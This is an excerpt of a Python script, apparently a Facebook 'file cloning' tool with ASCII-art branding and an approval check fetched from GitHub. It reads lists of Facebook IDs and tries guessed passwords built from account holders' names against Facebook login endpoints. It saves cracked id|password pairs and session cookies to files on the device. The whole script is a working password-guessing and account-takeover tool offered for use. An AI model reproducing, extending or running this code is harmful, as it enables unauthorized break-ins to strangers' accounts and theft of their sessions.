...
def menu_apikey():
  ...
  id = "→".join(uuid)
  server = requests.get('https://github.com/AungZawTun008/DRAGON/blob/main/approve.txt').text
...
\033[1;96m   ___  __   ___  _______ _____  ___________ __
\033[1;96m  / _ )/ /  / _ |/ ___/ //_/ _ \/  _/ ___/ //_/
\033[1;95m / _  / /__/ __ / /__/ ,< / // // // /__/ ,<   
\033[1;95m/____/____/_/ |_\___/_/|_/____/___/\___/_/|_| 
                                                                                                                   
                                   
\033[1;96m--------------------------------------------------\033[0m
[♥]\033[1;96mAuthor   : \033[1;96mBLACK
[♥]\033[1;96mFacebook :\033[1;96m AUNG ZAW TUN
[♥]\033[1;96mTool     : \033[1;96mFREE 
[♥]\033[1;96mVersion  : \033[1;96m1.0\033[0m
\033[1;96m------------------WELCOME BABY-------------------\033[0m""")
  ...
  print(f"")
  try:
    httpCaht = requests.get("https://github.com/AungZawTun008/DRAGON/blob/main/approve.txt").text
    if id in httpCaht:
      ...
      print(f"    Send  to Admin and get aproval"); time.sleep(2)
      os.system(f'xdg-open https://m.me/aztynk007'+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
def menu():
			clear()
		#	linex()
			print('\033[1;95m[1] File cloning\033[0m\n\033[1;95m[2] join facebook\033[0m\n\033[1;95m[0] Exit menu\033[0m')
			linex()
			xd=input(' \033[1;95mChoose an option: ')
		#	os.system('xdg-open https://www.facebook.com/dr.paigham')
			if xd in ['1','01']:
				clear()
				print('\033[1;95mPut file example:  /sdcard/File.txt  etc..')
				linex()
				file = input('\033[1;95mPut file path\033[1;37m: ')
				try:
					...
					menu()
				clear()
				print('\033[1;91mAll method working ')
				linex()
				print('\033[1;92m [1] \033[1;92mMethod  (for mix ids)  \033[1;32m (fast) \n\033[1;92m [2] \033[1;92mMethod  (for mix ids) \033[1;92m  (recommend)  \n\033[1;92m [3]\033[1;92m Method  (with cokies)\033[1;32m   (v.fast)\033[0m')
				linex()
				mthd=input('\033[1;94mChoose: ')
				linex()
				plist = []
				try:
					ps_limit = int(input(' How\033[1;95 many passwords do you want to add ? '))
				except:
					ps_limit =1
				clear()
				print('\033[1;92m exp: first last,firtslast,first123,firstlast123,First Last')
				linex()
...
def api1(ids,names,passlist):
		try:
			...
			for pw in passlist:
				...
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;93m [BD-OK] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/BD-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\033[1;93m [BD-CP] '+ids+' | '+pas+'\033[1;97m')
						open('/sdcard/BD-CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/BD-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;92m [BD-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;36m [BD-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/BD-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/BD-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\033[1;91m [BD-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/BD-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [BD-2F] '+uid+' | '+pas)
					else:
						print(f'\r\x1b[1;32m [BD-OK] '+uid+' | '+pas)
						open('/sdcard/BD-rnd-OK.txt', 'a').write(uid+'|'+pas+'\n')
						oks.append(uid)
						break
				...
				if uid in cps:pass
					...
					print('\r\r\033[1;93m [BD-CP] '+uid+' | '+pas+'\033[1;97m')
					open('/sdcard/BD-rnd-CP.txt', 'a').write(uid+'|'+pas+'\n')
					cps.append(ids)
					break
			else:
				continue
